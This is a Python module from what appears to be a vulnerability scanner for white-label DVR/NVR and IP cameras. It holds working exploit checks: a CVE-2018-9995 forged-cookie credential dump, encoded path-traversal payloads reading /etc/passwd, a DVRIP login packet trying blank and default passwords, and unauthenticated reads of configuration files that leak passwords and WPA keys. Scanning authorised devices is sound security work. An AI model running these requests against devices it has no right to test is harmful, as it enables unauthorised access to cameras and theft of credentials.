"""Checks for the white-label DVR/NVR platforms: TBK-family, TVT, Xiongmai, NUUO, WIFICAM."""

from __future__ import annotations

import json
import re
import struct

from ..core.models import Confidence, Credential, Finding, Severity
from ..core.net import raw_exchange
from .base import CheckContext, port_of, register

#: traversal encodings that embedded web servers resolve, tried against a known-good file
_TRAVERSAL_PATTERNS = (
    "/../../../../../../etc/passwd",
    "/..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/....//....//....//etc/passwd",
    "/..;/..;/..;/etc/passwd",
)
_PASSWD = re.compile(r"root:[x*!]?:0:0:")


@register("dvr_cookie_cred_dump", "CVE-2018-9995 DVR credential dump via forged cookie")
async def dvr_cookie_cred_dump(ctx: CheckContext) -> list[Finding]:
    """Request the user list with a forged session cookie; affected firmware returns cleartext."""
    out: list[Finding] = []
    for base in ctx.bases():
        resp = await ctx.probe.get(
            base + "/device.rsp?opt=user&cmd=list",
            headers={"Cookie": "uid=admin"},
        )
        if resp is None or resp.status_code != 200:
            continue
        body = resp.text
        accounts = _parse_dvr_users(body)
        if not accounts:
            continue
        for user, password in accounts:
            ctx.device.credentials.append(
                Credential(
                    username=user,
                    password=password,
                    service="http",
                    port=port_of(base),
                    note="disclosed in cleartext by CVE-2018-9995",
                )
            )
        shown = ", ".join(f"{u}:{p or '<empty>'}" for u, p in accounts[:5])
        out.append(
            ctx.finding(
                severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                evidence=f"forged cookie returned {len(accounts)} account(s) in cleartext: {shown}",
                matched_at=base + "/device.rsp?opt=user&cmd=list",
                port=port_of(base),
                tags=["auth-bypass", "credential-disclosure", "dvr"],
                extra={"accounts": [{"username": u, "password": p} for u, p in accounts]},
            )
        )
        return out
    return out


def _parse_dvr_users(body: str) -> list[tuple[str, str]]:
    """The endpoint returns JSON on most builds and a flat table on older ones."""
    accounts: list[tuple[str, str]] = []
    try:
        data = json.loads(body)
        for row in data.get("list", []) if isinstance(data, dict) else []:
            if isinstance(row, dict) and "uid" in row:
                accounts.append((str(row.get("uid", "")), str(row.get("pwd", ""))))
    except (ValueError, AttributeError):
        pass
    if not accounts:
        for m in re.finditer(r'"uid"\s*:\s*"([^"]*)"\s*,\s*"pwd"\s*:\s*"([^"]*)"', body):
            accounts.append((m.group(1), m.group(2)))
    return accounts


@register("generic_path_traversal", "Unauthenticated directory traversal / arbitrary file read")
async def generic_path_traversal(ctx: CheckContext) -> list[Finding]:
    """Walk out of the web root with several encodings and confirm by reading a known file."""
    out: list[Finding] = []
    prefixes = _vendor_traversal_prefixes(ctx.device.vendor)
    for base in ctx.bases():
        for prefix in prefixes:
            for pattern in _TRAVERSAL_PATTERNS:
                url = base + prefix + pattern
                resp = await ctx.probe.get(url)
                if resp is None or resp.status_code != 200:
                    continue
                if not _PASSWD.search(resp.text):
                    continue
                out.append(
                    ctx.finding(
                        severity=Severity.HIGH,
                        confidence=Confidence.CONFIRMED,
                        evidence=f"read /etc/passwd through the web root ({len(resp.text)} bytes)",
                        matched_at=url,
                        port=port_of(base),
                        tags=["path-traversal", "info-leak"],
                    )
                )
                return out
    return out


def _vendor_traversal_prefixes(vendor: str) -> list[str]:
    """Where the traversal has to start, per platform."""
    table = {
        "TVT": ["", "/doc/page", "/vi"],
        "Vivotek": ["", "/cgi-bin/admin", "/cgi-bin/viewer"],
        "TBK": ["", "/device.rsp"],
    }
    return table.get(vendor, [""])


@register("uc_httpd_detect", "uc-httpd 1.0.0 (CVE-2018-10088) exposure")
async def uc_httpd_detect(ctx: CheckContext) -> list[Finding]:
    """Flag the uc-httpd build whose request handling overflows a stack buffer."""
    out: list[Finding] = []
    for svc in ctx.device.web_services():
        server = svc.http_server or ""
        if "uc-httpd" not in server.lower():
            continue
        version = server.split("/")[-1].strip() if "/" in server else "unknown"
        vulnerable = version.startswith("1.0.0")
        out.append(
            ctx.finding(
                severity=Severity.CRITICAL if vulnerable else Severity.MEDIUM,
                confidence=Confidence.LIKELY if vulnerable else Confidence.POSSIBLE,
                evidence=(
                    f"Server header reports {server}. "
                    + ("1.0.0 is the build affected by the stack overflow." if vulnerable
                       else "Version not confirmed vulnerable; treat as unmaintained firmware.")
                ),
                matched_at=f"http://{ctx.device.host}:{svc.port}/",
                port=svc.port,
                tags=["buffer-overflow", "unmaintained-firmware"],
                extra={"server": server, "version": version},
            )
        )
    return out


@register("xiongmai_dvrip_probe", "Xiongmai DVRIP login on 34567 (default/blank admin)")
async def xiongmai_dvrip_probe(ctx: CheckContext) -> list[Finding]:
    """Speak DVRIP on 34567/8899 and attempt the documented blank-password administrator.

    This is a login attempt over the vendor's binary protocol - it reads a session, nothing
    is configured or written.
    """
    out: list[Finding] = []
    for port in (34567, 8899, 9000):
        if not ctx.device.service(port):
            continue
        for user, pw_hash, label in (
            ("admin", "tlJwpbo6", "empty password"),
            ("default", "tluafed", "documented default account"),
        ):
            payload = json.dumps(
                {
                    "EncryptType": "MD5",
                    "LoginType": "DVRIP-Web",
                    "PassWord": pw_hash,
                    "UserName": user,
                }
            ).encode() + b"\x0a\x00"
            packet = _dvrip_packet(1000, payload)
            reply = await raw_exchange(ctx.device.host, port, packet, ctx.cfg.timeout)
            if not reply or len(reply) < 20:
                continue
            body = reply[20:].decode("utf-8", "replace")
            if '"Ret" : 100' in body or '"Ret":100' in body:
                ctx.device.credentials.append(
                    Credential(
                        username=user,
                        password="" if label == "empty password" else "default",
                        service="dvrip",
                        port=port,
                        note=f"DVRIP login accepted ({label})",
                    )
                )
                out.append(
                    ctx.finding(
                        severity=Severity.CRITICAL,
                        confidence=Confidence.CONFIRMED,
                        evidence=f"DVRIP login on {port} accepted {user} with the {label}",
                        matched_at=f"dvrip://{ctx.device.host}:{port}",
                        port=port,
                        tags=["default-credentials", "dvrip", "xiongmai"],
                    )
                )
                return out
            if '"Ret"' in body:
                out.append(
                    ctx.finding(
                        severity=Severity.LOW,
                        confidence=Confidence.CONFIRMED,
                        title="Xiongmai DVRIP service exposed",
                        evidence=f"DVRIP service answered on port {port}; the login was rejected",
                        matched_at=f"dvrip://{ctx.device.host}:{port}",
                        port=port,
                        tags=["dvrip", "exposure"],
                    )
                )
                return out
    return out


def _dvrip_packet(msgid: int, payload: bytes, session: int = 0, sequence: int = 0) -> bytes:
    """Build the 20-byte DVRIP header plus payload.

    head(1) version(1) reserved(2) session(4) sequence(4) total(1) current(1) msgid(2) len(4)
    """
    return (
        struct.pack("<BBH", 0xFF, 0x01, 0x0000)
        + struct.pack("<II", session, sequence)
        + struct.pack("<BBH", 0x00, 0x00, msgid)
        + struct.pack("<I", len(payload))
        + payload
    )


@register("wificam_cred_leak", "CVE-2017-5674 GoAhead OEM camera cleartext credential leak")
async def wificam_cred_leak(ctx: CheckContext) -> list[Finding]:
    """Fetch the configuration file that these OEM cameras serve without authentication."""
    out: list[Finding] = []
    for base in ctx.bases():
        for path in ("/system.ini", "/system.ini?loginuse&loginpas", "/etc/system.ini"):
            resp = await ctx.probe.get(base + path)
            if resp is None or resp.status_code != 200:
                continue
            text = resp.text
            creds = _parse_system_ini(text)
            if not creds:
                continue
            for user, password in creds:
                ctx.device.credentials.append(
                    Credential(username=user, password=password, service="http",
                               port=port_of(base), note="cleartext in system.ini (CVE-2017-5674)")
                )
            out.append(
                ctx.finding(
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CONFIRMED,
                    evidence="configuration served without authentication, containing "
                    + ", ".join(f"{u}:{p or '<empty>'}" for u, p in creds),
                    matched_at=base + path,
                    port=port_of(base),
                    tags=["credential-disclosure", "info-leak"],
                )
            )
            return out
    return out


def _parse_system_ini(text: str) -> list[tuple[str, str]]:
    user = re.search(r"loginuse\s*[=:]\s*(\S+)", text)
    pw = re.search(r"loginpas\s*[=:]\s*(\S*)", text)
    if user:
        return [(user.group(1).strip(), (pw.group(1).strip() if pw else ""))]
    # some builds dump the raw struct; look for an admin-ish pair
    if "admin" in text and len(text) < 4096 and "\x00" in text:
        return [("admin", "<binary blob returned - inspect manually>")]
    return []


@register("netwave_info_leak", "Netwave OEM camera memory / config disclosure")
async def netwave_info_leak(ctx: CheckContext) -> list[Finding]:
    """Read the diagnostic endpoints that leak the stored wifi and login configuration."""
    out: list[Finding] = []
    for base in ctx.bases():
        for path in ("/etc/RT2870STA.dat", "/etc/passwd", "/get_status.cgi"):
            resp = await ctx.probe.get(base + path)
            if resp is None or resp.status_code != 200 or len(resp.text) < 20:
                continue
            text = resp.text
            interesting = any(
                k in text for k in ("WPAPSK", "SSID", "root:", "sys_ver", "alias")
            )
            if not interesting:
                continue
            out.append(
                ctx.finding(
                    severity=Severity.HIGH,
                    confidence=Confidence.CONFIRMED,
                    evidence=f"unauthenticated read of {path} ({len(text)} bytes) containing "
                    "device and network configuration",
                    matched_at=base + path,
                    port=port_of(base),
                    tags=["info-leak"],
                )
            )
            return out
    return out
